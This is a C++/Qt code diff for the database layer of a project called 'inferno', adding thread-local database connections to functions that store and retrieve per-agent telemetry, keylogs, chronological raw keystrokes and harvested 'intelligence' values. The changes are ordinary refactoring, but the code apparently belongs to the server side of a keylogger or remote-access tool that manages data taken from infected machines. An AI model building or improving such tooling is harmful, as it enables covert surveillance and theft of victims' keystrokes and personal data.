@@ -3,6 +3,8 @@
 #include <QtSql/QSqlDriver>
 #include <QtSql/QSqlField>
 #include <QTimeZone>
+#include <QThread>
+#include <QCoreApplication>
 
 namespace inferno {
 
@@ -45,6 +47,23 @@ void Inferno_Database::close() {
     if (m_db.isOpen()) {
         m_db.close();
     }
+}
+
+QSqlDatabase Inferno_Database::getDatabaseConnection() const {
+    if (QThread::currentThread() == QCoreApplication::instance()->thread()) {
+        return m_db;
+    }
+    
+    QString connName = QString("ThreadDbConn_%1").arg(reinterpret_cast<quintptr>(QThread::currentThreadId()));
+    if (QSqlDatabase::contains(connName)) {
+        return QSqlDatabase::database(connName);
+    }
+
+    QSqlDatabase db = QSqlDatabase::cloneDatabase(m_db, connName);
+    if (!db.open()) {
+        qDebug() << "[Database] Error opening thread-local database connection:" << db.lastError().text();
+    }
+    return db;
 }
 
 bool Inferno_Database::createTables() {
@@ -310,7 +329,7 @@ AgentProfile Inferno_Database::getAgentProfile(const QString& uuid) {
 
 QStringList Inferno_Database::getTelemetryHistory(const QString& uuid, const QString& type, int limit) {
     QStringList history;
-    QSqlQuery query;
+    QSqlQuery query(getDatabaseConnection());
     
     QString sql = "SELECT timestamp, content FROM telemetry WHERE agent_uuid = :uuid ";
     if (!type.isEmpty() && type != "ALL") {
@@ -366,7 +385,7 @@ QStringList Inferno_Database::getKeylogHistory(const QString& uuid, int limit) {
 
 QString Inferno_Database::getRawKeylogsChronological(const QString& uuid) {
     if (uuid.isEmpty() || uuid == "UNKNOWN_UUID") return "";
-    QSqlQuery query(m_db);
+    QSqlQuery query(getDatabaseConnection());
     query.prepare("SELECT k.data FROM keylogs k "
                   "JOIN agents a ON a.id = k.agent_id "
                   "WHERE a.uuid = :uuid "
@@ -387,8 +406,10 @@ QString Inferno_Database::getRawKeylogsChronological(const QString& uuid) {
 bool Inferno_Database::logIntelligence(const QString& uuid, const QString& type, const QString& value, const QString& context) {
     if (uuid.isEmpty() || uuid == "UNKNOWN_UUID") return false;
 
+    QSqlDatabase db = getDatabaseConnection();
+
     // Fetch all existing intelligence findings of this type for this agent
-    QSqlQuery checkQuery(m_db);
+    QSqlQuery checkQuery(db);
     checkQuery.prepare("SELECT id, value FROM intelligence WHERE agent_uuid = :uuid AND data_type = :type");
     checkQuery.bindValue(":uuid", uuid);
     checkQuery.bindValue(":type", type);
@@ -431,7 +452,7 @@ bool Inferno_Database::logIntelligence(const QString& uuid, const QString& type,
         
         if (!idsToUpdate.isEmpty()) {
             // Update the first matching substring entry to the new value
-            QSqlQuery updateQuery(m_db);
+            QSqlQuery updateQuery(db);
             updateQuery.prepare("UPDATE intelligence SET value = :value, context = :context, timestamp = CURRENT_TIMESTAMP WHERE id = :id");
             updateQuery.bindValue(":value", value);
             updateQuery.bindValue(":context", context);
@@ -444,7 +465,7 @@ bool Inferno_Database::logIntelligence(const QString& uuid, const QString& type,
             
             // Delete any subsequent substring entries that are also merged into the new value
             for (int delId : idsToDelete) {
-                QSqlQuery deleteQuery(m_db);
+                QSqlQuery deleteQuery(db);
                 deleteQuery.prepare("DELETE FROM intelligence WHERE id = :id");
                 deleteQuery.bindValue(":id", delId);
                 deleteQuery.exec();
@@ -454,26 +475,26 @@ bool Inferno_Database::logIntelligence(const QString& uuid, const QString& type,
         }
     }
 
-    QSqlQuery query(m_db);
+    QSqlQuery query(db);
     QSqlField f_uuid("", QMetaType::fromType<QString>()); f_uuid.setValue(uuid);
     QSqlField f_type("", QMetaType::fromType<QString>()); f_type.setValue(type);
     QSqlField f_value("", QMetaType::fromType<QString>()); f_value.setValue(value);
     QSqlField f_context("", QMetaType::fromType<QString>()); f_context.setValue(context);
 
     QString sql;
-    if (m_db.driverName() == "QSQLITE") {
+    if (db.driverName() == "QSQLITE") {
         sql = QString("INSERT OR IGNORE INTO intelligence (agent_uuid, data_type, value, context) VALUES (%1, %2, %3, %4)")
-            .arg(m_db.driver()->formatValue(f_uuid))
-            .arg(m_db.driver()->formatValue(f_type))
-            .arg(m_db.driver()->formatValue(f_value))
-            .arg(m_db.driver()->formatValue(f_context));
+            .arg(db.driver()->formatValue(f_uuid))
+            .arg(db.driver()->formatValue(f_type))
+            .arg(db.driver()->formatValue(f_value))
+            .arg(db.driver()->formatValue(f_context));
     } else {
         sql = QString("INSERT INTO intelligence (agent_uuid, data_type, value, context) VALUES (%1, %2, %3, %4) "
                       "ON CONFLICT (agent_uuid, data_type, value) DO NOTHING")
-            .arg(m_db.driver()->formatValue(f_uuid))
-            .arg(m_db.driver()->formatValue(f_type))
-            .arg(m_db.driver()->formatValue(f_value))
-            .arg(m_db.driver()->formatValue(f_context));
+            .arg(db.driver()->formatValue(f_uuid))
+            .arg(db.driver()->formatValue(f_type))
+            .arg(db.driver()->formatValue(f_value))
+            .arg(db.driver()->formatValue(f_context));
     }
 
     if (!query.exec(sql)) {
